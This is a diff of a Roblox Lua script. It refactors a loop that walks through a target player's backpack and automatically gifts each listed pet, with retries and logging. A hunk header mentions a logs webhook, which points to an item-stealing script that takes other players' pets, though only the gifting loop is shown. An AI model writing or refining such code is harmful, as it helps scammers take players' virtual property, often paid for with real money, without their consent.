@@ -816,16 +816,29 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
     task.wait(1)
 
     -- Gifting loop
-    for _, pet in ipairs(pets) do
-        for _, tool in targetPlr.Backpack:GetChildren() do
-            if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" and tool:GetAttribute("PET_UUID") == pet.Id then
-                print("Gifting:", tool.Name)
+for _, tool in ipairs(targetPlr.Backpack:GetChildren()) do
+    if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
+        local uuid = tostring(tool:GetAttribute("PET_UUID") or "")
+        for _, pet in ipairs(pets) do
+            if tostring(pet.Id) == uuid then
+                print("[Gifting] Attempting to gift:", tool.Name, "UUID:", uuid)
+                local success = false
                 for attempt = 1, 3 do
-                    result = safeGiftTool(tool)
-                    if result then
+                    if safeGiftTool(tool) then
+                        print("[Gifting] Successfully gifted:", tool.Name)
+                        success = true
                         break
+                    else
+                        warn("[Gifting] Failed attempt", attempt, "for:", tool.Name)
+                        task.wait(1)
                     end
-                end       
+                end
+                -- Jika berhasil, tunggu sedikit sebelum lanjut
+                if success then
+                    task.wait(0.8)
+                end
+                break -- lanjut ke tool berikutnya
             end
         end
     end
+end
